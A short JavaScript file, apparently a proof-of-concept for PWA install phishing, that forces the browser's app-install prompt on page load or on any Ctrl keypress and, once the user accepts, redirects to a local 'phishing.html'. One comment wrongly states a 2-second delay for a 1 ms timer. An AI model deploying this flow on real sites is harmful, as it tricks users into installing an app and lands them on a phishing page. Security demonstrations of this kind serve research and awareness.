navigator.serviceWorker.register("dummy-sw.js");

window.addEventListener("DOMContentLoaded", async event => {
  if ('BeforeInstallPromptEvent' in window) {
    showResult("⏳ BeforeInstallPromptEvent supported but not fired yet");
  } else {
    showResult("❌ BeforeInstallPromptEvent NOT supported");    
  }

  // Listen for the 'keydown' event to detect when 'Ctrl' is pressed
  document.addEventListener("keydown", (event) => {
    // Check if the 'Ctrl' key is pressed
    if (event.ctrlKey) {
      installApp(); // Trigger install app when 'Ctrl' is pressed
    }
  });

  setTimeout(function(){
    installApp();  // This will still trigger install after 2 seconds
  }, 1);
  
});

let deferredPrompt;

window.addEventListener('beforeinstallprompt', (e) => {
  // Prevent the default mini-infobar or install dialog from appearing on mobile
  e.preventDefault();
  // Save the event because you’ll need to trigger it later.
  deferredPrompt = e;
  // Show your customized install prompt for your PWA
  showResult("✅ BeforeInstallPromptEvent fired", true);
});

window.addEventListener('appinstalled', (e) => {
  showResult("✅ AppInstalled fired", true);
});

async function installApp() {
  if (deferredPrompt) {
    deferredPrompt.prompt();  // Show the install prompt
    showResult("🆗 Installation Dialog opened");
    
    // Wait for the user's choice
    const { outcome } = await deferredPrompt.userChoice;
    deferredPrompt = null;  // After it's used, set it to null
    
    if (outcome === 'accepted') {
      showResult('😀 User accepted the install prompt.', true);
      location.href = "./phishing.html";  // You might want to handle this redirection carefully
    } else if (outcome === 'dismissed') {
      showResult('😟 User dismissed the install prompt');
    }
  }
}

function showResult(text, append=false) {
  if (append) {
    document.querySelector("output").innerHTML += "<br>" + text;
  } else {
    document.querySelector("output").innerHTML = text;    
  }
}

